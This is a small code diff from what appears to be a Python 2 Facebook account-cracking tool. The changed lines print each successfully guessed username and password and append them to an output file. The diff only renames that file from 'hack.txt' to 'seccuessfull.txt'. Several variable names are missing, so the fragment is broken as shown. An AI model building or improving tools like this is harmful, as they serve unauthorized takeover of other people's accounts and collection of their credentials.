@@ -319,7 +319,7 @@ def pilih_super():
 			else:
 				if 'www.facebook.com' in q["open_msg"]:
 					print '\x1b[1;95mseccuessfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
-					 = open("out/hack.txt", "a")
+					 = open("out/seccuessfull.txt", "a")
 					.write(user+"|"+pass1+"\n")
 					.close()
 					.append(user+pass1)
